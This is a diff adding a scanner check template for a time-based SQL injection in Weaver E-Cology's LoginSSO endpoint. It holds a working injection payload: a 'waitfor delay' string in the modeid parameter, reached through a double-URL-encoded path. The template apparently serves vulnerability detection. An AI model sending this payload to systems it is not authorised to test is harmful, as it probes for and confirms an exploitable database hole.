@@ -1,0 +1,15 @@
+name: 泛微E-Cology-LoginSSO-SQL注入
+description: >
+  延时注入
+alwaysExecute: false
+timeout: 8
+matchCount: 2
+rules:
+  - method: GET
+    path: /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30?modeid=1452+waitfor+delay+'0%3a0%3a5'
+    expression:
+      sleep: 5
+  - method: GET
+    path: /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30?modeid=1452+waitfor+delay+'0%3a0%3a3'
+    expression:
+      sleep: 3
